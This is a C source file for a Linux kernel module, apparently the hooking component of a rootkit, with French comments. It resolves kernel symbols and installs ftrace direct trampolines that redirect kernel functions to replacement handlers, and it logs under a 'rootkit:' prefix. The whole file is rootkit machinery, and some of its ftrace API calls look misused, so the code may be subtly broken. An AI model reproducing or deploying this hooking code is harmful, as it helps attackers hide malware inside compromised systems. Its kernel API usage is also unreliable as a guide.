#include "hooking.h"
#include "ksym.h"
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/ftrace.h>
#include <linux/version.h>

// Cette fonction résout l'adresse du symbole et stocke l'adresse dans hook->address.
// Elle stocke également l'adresse trouvée dans *hook->original pour un usage ultérieur.
static int resolve_hook_addr(struct ftrace_hook *hook) {
    hook->address = ksym_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rootkit: symbol %s not found\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

int install_hook(struct ftrace_hook *hook) {
    int err;

    // Résoudre l'adresse du symbole
    err = resolve_hook_addr(hook);
    if (err)
        return err;

    // Initialiser la structure ops
    // On ne définit pas ops.func ou ops.direct_func, on utilise la trampoline directe
    hook->ops.func = NULL; 
    hook->ops.flags = FTRACE_OPS_FL_DIRECT | FTRACE_OPS_FL_SAVE_REGS;

    // Enregistrer une trampoline directe
    // Note: Pas de fonction de remplacement directement ici
    err = register_ftrace_direct(&hook->ops, hook->address);
    if (err) {
        pr_err("rootkit: register_ftrace_direct failed for %s: %d\n", hook->name, err);
        return err;
    }

    // Maintenant, définir la fonction de remplacement via arch_ftrace_set_direct_caller()
    err = arch_ftrace_set_direct_caller(&hook->ops, (unsigned long)hook->function);
    if (err) {
        pr_err("rootkit: arch_ftrace_set_direct_caller failed for %s: %d\n", hook->name, err);
        // En cas d'erreur, on retire la trampoline
        unregister_ftrace_direct(&hook->ops, hook->address);
        return err;
    }

    pr_info("rootkit: hook installed for %s at %lx -> %p\n", hook->name, hook->address, hook->function);
    return 0;
}

void remove_hook(struct ftrace_hook *hook) {
    // Remettre le caller à 0 avant de désenregistrer
    arch_ftrace_set_direct_caller(&hook->ops, 0);
    unregister_ftrace_direct(&hook->ops, hook->address);
    pr_info("rootkit: hook removed for %s\n", hook->name);
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            // En cas d'échec, on retire ceux déjà installés
            while (i > 0) {
                remove_hook(&hooks[--i]);
            }
            return err;
        }
    }

    return 0;
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}
